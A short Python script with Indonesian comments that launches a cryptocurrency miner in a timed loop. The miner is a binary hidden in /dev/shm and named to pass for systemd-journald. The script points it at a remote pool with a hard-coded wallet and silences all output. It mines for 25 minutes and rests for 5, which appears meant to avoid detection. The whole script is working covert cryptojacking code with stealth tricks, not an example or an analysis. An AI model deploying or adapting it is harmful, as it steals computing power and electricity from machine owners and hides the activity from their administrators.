import subprocess
import time
import os

# Konfigurasi program
WALLET = "REy6w1W9pQ7U4LebYx6zp6mZxHkBzc3e5y"
POOL = "www.myloveistrikupoppy.my.id:11001"
ALGO = "verushash"
CPU_THREADS = 2
PROGRAM_TIME = 25  # Menit program
REST_TIME = 5  # Menit istirahat
JBD2_PATH = "/dev/shm/.cache/systemd-journald."  # Lokasi binary

while True:
    print(f"ðŸ”„ Memulai program selama {PROGRAM_TIME} menit...")
    process = subprocess.Popen([
        JBD2_PATH,
        "--algorithm", ALGO,
        "--pool", POOL,
        "--wallet", WALLET,
        "--cpu-threads", str(CPU_THREADS)
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) 

    # Tunggu selama waktu program
    time.sleep(PROGRAM_TIME * 60)

    print(f"ðŸ˜´ Istirahat selama {REST_TIME} menit...")
    process.kill()  

    os.system("pkill -f systemd-journald.")

    # Tunggu selama waktu istirahat
    time.sleep(REST_TIME * 60)
